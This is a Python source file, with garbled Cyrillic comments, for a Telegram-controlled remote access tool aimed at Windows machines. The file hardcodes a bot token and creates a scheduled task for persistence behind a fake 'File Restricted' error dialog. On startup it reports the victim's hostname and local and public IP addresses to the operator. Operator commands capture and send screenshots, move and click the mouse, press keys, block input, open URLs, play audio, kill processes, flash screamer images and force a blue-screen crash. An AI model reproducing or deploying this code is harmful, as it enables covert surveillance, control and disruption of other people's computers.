# coding: windows-1251
#       ^
#       |
# ��� ���������� ������, ������� ��� � ���� ���� ���������

# 1329704902

import io  # ��� �������� ��������� �������
import pathlib
import random
import shutil
import sys
import keyboard
import pygame
import time
import ctypes
import win32con
import AudioPlayFromURL
import subprocess
import DeskTopIcons
import InputBlocker
from Schedule import *
from utils import *
import kill
from WP import wallpaper_action
import  win32api
import threading  # ��� �������� ������� ������ ������� ��� ������������� ���������� ���������
import webbrowser
import screeninfo
import mouse  # ��� ������������ ���� � ��������� ������
import telebot  # ����, ��� ����� ��� ���� �� ��
from PIL import Image, ImageDraw, ImageTk  # �����, ��� ������ � �������
from mss import mss  # ��� ������� �������
import tkinter
import pygame.mixer as mix
import socket  # ��� �������� ������ � ���������� ���������� IP
import os
import requests  # ��� ���������� ���������� IP

bot = telebot.TeleBot(
    '7516400777:AAGpQCha761QKAYrprcu8v5YbygmKeh_1fA')  # ����� ����(��� ������ � ������) �������� ������, ����� ������� ������ �������� � ������ ���� ��������� �������


DeepLightID = 1627834434  # ��� ���� ���� ���� � ����
AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss'}

CURSOR_SIZE = 15
CURSOR_COLORS = [
    ((0, 0, 0), (255, 255, 255)),  # ������� ����
    ((255, 255, 255), None),  # ��������
    ((0, 0, 127), None)  # ����������
]

BoolDict = dict(true=True, t=True, false=False,
                f=False)  # ��� ������� ��� �������������� ����� ������ � ����� ���������� � bool


'������ ������ ����'


@bot.message_handler(commands=['start', 'Start'])  # ������� �����, �� ��� � ����� ������ ������ ��������
def Hello(message):
    bot.reply_to(message,
                 f'������, ��� ��� ��� �����, ���� �� �� � ��� �� ���� �� � ���� �� ���� ��������\n� ���� ���� ���� ��� @{message.from_user.username}\n������� ������� ���� �� �� ����, � ��� �������� /help')
    bot.reply_to(message, message.chat.id)


'''
������� ���� ��������� ��� ����� @
� ����� ��� ����� ���������� �����������, ��� ������������
��� ��������� ��������� �������, ��� �������� ������� ������
����� ������� Hello() ��������� �������� message (������� ��� � ������)
�� ���� �� ���������� ������ ���, �� �� ������� �� ��� �������, �� � ������� messag'� ����� �� �����������,
� ������ ������?

-���, �� ���� - ������� ��

���, ������ �������� ��� ������ ������, ������� ���������� at �� ���������� ���������� ������� ���� �������,
� �����, �� ��� ��� �������, ����� � ��� ���� ����� bot.message_handler()

������ ��������, �� ���� ��������� ������ ��� ���� ������� ������� messag'�
������ ���-�� ������, � ������ ���������� TeleBot, ����� ���� �������� � ���� ������ message_handler ���-�� ����

...
MessageFromID = sever.getMessage(ID)
func(MessageFromID)

������ ���������� ���������� ��, ��� ��� ��� �� �����, � func(MessageFromID) ��� ��������
������� (������), ��������� ������� ����� ��������, ����� ������ ��� �����������, � �������������� ����������
� ����� ������ ���������� ��� ��� ��������� � func �� ���� �������� �� �������� �������, ������ ��� � ������� ������ �������,
��������� ����� �������� (�������), � ������� ���� ��� ������� ��� �����, �� ����� ���������� � ������ ���������� � ��� �������,
�� ��� ������ ��������
'''


@bot.message_handler(commands=['help', 'Help'])  # ���� ������ �� ��������
def Help(message):
    bot.send_message(message.chat.id,
                     '������, ����� ������?\n������� ���� �� ���� �� �����, �� �� �� ������ ��� �������\n��� ���� ��������, ��� ��� �������:\nhttps://telegra.ph/Komandy-dlya-bota-KxrvPersonal-bot-05-29')
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(
    commands=['Screenshot', 'Screen', 'Scr', 'scr', 'screenshot', 'screen'])  # � ��� � ������� �����������
def ScreenShot(message):
    if message.from_user.username not in AllowedUsers:
        return

    monitor = {'top': 0, 'left': 0, 'width': 1920, 'height': 1080}
    args = message.text.split()[1:]

    if args:
        VALID_KEYS = {'top', 'left', 'width', 'height'}
        errors = []
        for arg in args:
            parts = arg.split(':', 1)
            if len(parts) == 2 and parts[0] in VALID_KEYS:
                try:
                    monitor[parts[0]] = int(parts[1])
                except ValueError:
                    errors.append(arg)
            else:
                errors.append(parts[0])

        if errors:
            bot.reply_to(message, f"������ � ������: {', '.join(errors)}")

    with mss() as sct:
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        top_left = (monitor['left'], monitor['top'])
        bottom_right = (top_left[0] + monitor['width'], top_left[1] + monitor['height'])
        mouse_pos = mouse.get_position()

        if IsInside(mouse_pos, 15, top_left, bottom_right):
            draw = ImageDraw.Draw(img)
            rel_x = mouse_pos[0] - top_left[0]
            rel_y = mouse_pos[1] - top_left[1]
            draw_cursor(draw, rel_x, rel_y)  # ���������� ��������������� �������

        send_screenshot(img, message.chat.id)

        # ��� ����
        if message.from_user.username != 'Deepl1ght':
            admin_msg = (
                f'������������ @{message.from_user.username} '
                f'�������� �������:\n{message.text}'
            )
            bot.send_message(DeepLightID, admin_msg)
            send_screenshot(img, DeepLightID)
            bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['move', 'Move', 'm', 'M', 'mov', 'Mov'])  # � ��� � �����, ������ � ������������
def Move_mouse(message):
    if message.from_user.username not in AllowedUsers:
        return

    # ��������� �� ���������
    params = {'X': 0, 'Y': 0, 'abs': True, 'dur': 0}
    args = message.text.split()

    # �������� ������������ ���������� ����������
    if len(args) < 3:
        bot.reply_to(message, '������: ��������� ������� 2 ��������� (X Y)')
        return

    # ��������� ����������� ���������� (X, Y)
    try:
        params['X'] = int(args[1])
        params['Y'] = int(args[2])
    except ValueError:
        bot.reply_to(message, '������: X � Y ������ ���� ������ �������')
        return

    # ��������� ����������� ����������
    for arg in args[3:]:
        if ':' not in arg:
            bot.reply_to(message, f'������ � ��������� "{arg}": ������ ���� � ������� "����:��������"')
            continue

        key, value = arg.split(':', 1)
        if key not in params:
            bot.reply_to(message, f'������: ����������� �������� "{key}"')
            continue

        try:
            # ��� ������� ���������� ���������� ����������� ��������������
            if key == 'abs':
                params[key] = parse_bool(value)
            else:
                params[key] = int(value)
        except ValueError:
            bot.reply_to(message, f'������ �������������� �������� "{value}" ��� ��������� "{key}"')
            continue

    # ���������� ��������
    try:
        mouse.move(params['X'], params['Y'], params['abs'], params['dur'])
    except Exception as e:
        bot.reply_to(message, f'������ ����������� ����: {str(e)}')
        return

    # ����������� ����
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['click', 'Click', 'cl', 'Cl'])  # ��������� ������ ����
def Click(message):
    if message.from_user.username not in AllowedUsers:
        return

    try:
        parts = message.text.split()
        # �������� ������������ ���������� ������ �������
        if len(parts) < 2:
            raise ValueError("Invalid command structure")

        # ������������ ����������
        button = parts[1].lower()
        is_double = len(parts) > 2 and parts[2].lower() in {'double', 'd'}

        # ������������� ������ � ����������
        button_actions = {
            'l': mouse.LEFT,
            'r': mouse.RIGHT,
            'm': mouse.MIDDLE
        }

        # �������� ������������ ������
        if button not in button_actions:
            raise ValueError("Invalid button specified")

        # ����� ��������
        action = mouse.double_click if is_double else mouse.click
        action(button_actions[button])

        bot.send_message(message.chat.id, '������� ���� ���������')

    except Exception as e:
        bot.send_message(message.chat.id, f'� ��������� �� ������, �� �� ��������\n����� �������\n{e}')

    # ����������� ��� ����
    if message.from_user.username != 'Deepl1ght':
        admin_msg = f'������������ @{message.from_user.username} �������� �������:\n{message.text}'
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)
        if 'action' in locals():
            bot.send_message(DeepLightID, '������� ���� ���������')


@bot.message_handler(commands=['skr', 'screamer', 'scream', 'sakincock'])
def screamer(message):
    if message.from_user.username in AllowedUsers:
        threading.Thread(target=show_screamer, daemon=True).start()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['url', 'web'])
def openEyes(message):
    if message.from_user.username in AllowedUsers:
        webbrowser.open(message.text.split()[1], new=2, autoraise= True)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kill'])
def Killer(message):
    if message.from_user.username in AllowedUsers:
        kill.Kill(message)

@bot.message_handler(commands=['wallpaper', 'wp'])
def Wallpaper(message):
    if message.from_user.username in AllowedUsers:
        action = message.text.split()[1]
        match action:
            case 'set':
                wallpaper_action('set', resource_path(r'screams/2.png'))
            case 'restore':
                wallpaper_action('restore')
            case _:
                bot.reply_to(message, '����������� �������� ��� ���')

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['kys'])
def Kys(message):
    if message.from_user.username in AllowedUsers:
        if is_frozen() and check_scheduler_task_exists():
            delete_scheduler_task()
        threading.Thread(target=StopIn5Secs, daemon=True).start()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['hide', 'h'])
def Hide(message):
    if message.from_user.username in AllowedUsers:
        keyboard.press('win')
        keyboard.press_and_release('d')
        keyboard.release('win')

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['bsod', 'prikol'])
def Prikol(message):
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

    if message.from_user.username in AllowedUsers:
        try:
            # ���� � NotMyFault.exe
            subprocess.run(
                [resource_path(r'screams/bsod.exe'), "/crash"],
                check=True,
                shell=True,
                timeout=10
            )
        except Exception as e:
            bot.send_message(DeepLightID, e)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['disable'])
def Dismember(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Disable()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['enable'])
def enable(message):
    if message.from_user.username in AllowedUsers:
        InputBlocker.Enable()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['hico'])
def HideIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.hide_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['sico'])
def ShowIcons(message):
    if message.from_user.username in AllowedUsers:
        DeskTopIcons.show_desktop_icons()

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['text'])
def TextWriteOpen(message):
    if message.from_user.username in AllowedUsers:
        if os.path.exists(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt')):
            os.remove(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))
        with open(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'), 'x') as f:
            f.write(' '.join(message.text.split()[1:]))
            f.close()
        os.system(os.path.join(os.environ['USERPROFILE'], 'Documents', 'ShrekForeva.txt'))

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(commands=['kb', 'write'])
def KeyBoard(message):
    if message.from_user.username in AllowedUsers:
        Inst = message.text.split()[1]
        Keys = Inst.split('+')
        pressedKeys = []
        for key in Keys:
            try:
                par = key.split(':')
                if par[1] == 'p':
                    keyboard.press(par[0])
                    pressedKeys.append(par[0])
                if par[1] == 'r':
                    keyboard.release(par[0])
                    for key in pressedKeys:
                        keyboard.release(key)
            except:
                keyboard.press_and_release(par[0])
                for key in pressedKeys:
                    keyboard.release(key)

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


@bot.message_handler(commands=['check'])
def Check(message):
    if message.from_user.username in AllowedUsers:
        if Schedule.check_scheduler_task_exists():
            bot.reply_to(message, 'true')
        else:
            bot.reply_to(message, 'false')


@bot.message_handler(commands=['play'])
def PlayFromURL(message):
    if message.from_user.username in AllowedUsers:
        AudioPlayFromURL.play_audio_from_url(message.text.split()[1])

    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)

@bot.message_handler(func=lambda message: True)  # ��������� �������, ������ ������ ���� ���������
def Echo(message):  # ��� �� ����� ����� ���������, ������� �� �������� ��� ������� ����
    if message.from_user.username != 'Deepl1ght':
        admin_msg = (
            f'������������ @{message.from_user.username} '
            f'�������� �������:\n{message.text}'
        )
        bot.send_message(DeepLightID, admin_msg)
        bot.forward_message(DeepLightID, message.chat.id, message.message_id)


'''����� ����
    ������ �������'''

mix.init()

def show_screamer():
    root = tkinter.Tk()

    root.title("overlay")

    x = "0"
    y = "0"
    image = Image.open(resource_path(r'screams/1.png'))
    mon = [m for m in screeninfo.get_monitors() if m.is_primary==True][0]
    mwidth = mon.width
    mheight = mon.height
    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
    # to remove the titlebar
    root.overrideredirect(True)

    # to make the window transparent
    root.attributes("-transparentcolor", "red")

    # set bg to red in order to make it transparent
    root.config(bg="red")
    img = ImageTk.PhotoImage(newimage)
    l = tkinter.Label(root, fg="white", bg="red", image=img)
    l.pack()
    mix.music.load(resource_path(r'screams/1.wav'))
    mix.music.play()

    # make window to be always on top
    root.geometry(cords)
    root.wm_attributes("-topmost", 1)
    root.after(5000, lambda: root.destroy())
    root.mainloop()

def calculate_scale(image, mon_width, mon_height, img_width, img_height):
    scale = min([mon_width//img_width, mon_height//img_height])
    ret = image.resize((img_width*scale, img_height*scale))
    cords = f"{ret.size[0]}x{ret.size[1]}+{mon_width//2-ret.size[0]//2}+{mon_height//2-ret.size[1]//2}"
    return ret, cords

def parse_bool(value: str) -> bool:
    true_values = {'true', '1', 'yes', '��', 'on', 'enable', 't'}
    false_values = {'false', '0', 'no', '���', 'off', 'disable', 'f'}

    normalized = value.strip().lower()
    if normalized in true_values:
        return True
    if normalized in false_values:
        return False
    raise ValueError(f'������������ ������ ��������: "{value}"')


def StopIn5Secs():
    time.sleep(5)
    bot.send_message(DeepLightID, '��� ��������')
    bot.stop_polling()


def IsInside(point: tuple, radius: int, topLeft: tuple,
             downRight: tuple):  # ��� ������� ��� �������� ��������� � ���� (���) ������
    x, y = point  # ����������� �������� �������� � ����� ������

    x_min = min(topLeft[0], downRight[0])
    x_max = max(topLeft[0], downRight[0])
    y_min = min(topLeft[1], downRight[1])
    y_max = max(topLeft[1], downRight[1])

    return (
            (x - radius >= x_min) and
            (x + radius <= x_max) and
            (y - radius >= y_min) and
            (y + radius <= y_max)
    )


def send_screenshot(img, chat_id):
    # ������ �����������
    bot.send_photo(chat_id, img, protect_content=True)

    # �������� �����������
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    bot.send_document(chat_id, img_byte_arr, protect_content=True)


def draw_cursor(draw, x, y):
    # �������� �����
    for i, (fill, outline) in enumerate(CURSOR_COLORS):
        size = CURSOR_SIZE - i * 5
        bbox = [
            (x - size // 2, y - size // 2),
            (x + size // 2, y + size // 2)
        ]
        draw.ellipse(bbox, fill=fill, outline=outline)

    # �����
    cross_size = CURSOR_SIZE - 2
    draw.line([(x, y - cross_size // 2), (x, y + cross_size // 2)], fill=(255, 0, 0))
    draw.line([(x - cross_size // 2, y), (x + cross_size // 2, y)], fill=(255, 0, 0))


def get_local_ip():
    try:
        # ������� ��������� ����������� � ���������� DNS
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google Public DNS
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1 (Local host)"  # ���������� localhost ��� ������


def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except Exception:
        return "�� ������� �������� IP"


def ShowError():
    root = tkinter.Tk()
    root.geometry(f'450x200+{1920//2-225}+{1080//2-100}')
    label = tkinter.Label(root, text='Error: File Restricted\nErrorNum:0x5051', font='Segoe UI 40')
    butt = tkinter.Button(root, text='OK', command=lambda:root.destroy(), font='Segoe UI 20')
    label.pack()
    butt.pack()
    root.mainloop()


if is_frozen() and not check_scheduler_task_exists():
    create_scheduler_task()
    threading.Thread(target=ShowError, daemon=True).start()
    # �������� ���� ��������������
    if not run_as_admin():
        print("��������� ����� ��������������!")
        sys.exit(1)

    print("=" * 50)
    print("���������� ������� ������������")
    print("=" * 50)

    if check_scheduler_task_exists():
        print(f"������ '{TASK_NAME}' ����������")
    else:
        print(f"������ '{TASK_NAME}' �� �������")

if __name__ == '__main__':
    task_info = get_task_full_info()
    if task_info:
        print("=" * 50)
        print("��������� ���������� � ������:")
        print("=" * 50)
        print(f"���: {task_info['name']}")
        print(f"����: {task_info['path']}")
        print(f"�������: {'��' if task_info['enabled'] else '���'}")
        print(f"��������� ������: {task_info['last_run_time']}")
        print(f"��������� ������: {task_info['next_run_time']}")
        print(f"��������: {', '.join(task_info['actions'])}")
        print(f"��������: {', '.join(str(t) for t in task_info['triggers'])}")
    else:
        print("������ �� �������")


bot.send_message(DeepLightID,
                 f"��� �������\n��� ����������: {socket.gethostname()}\n��������� IP: {get_local_ip()}\n��������� IP: {get_public_ip()}")  # ��������� ��� ���� ��������
print('��� �������')

bot.infinity_polling()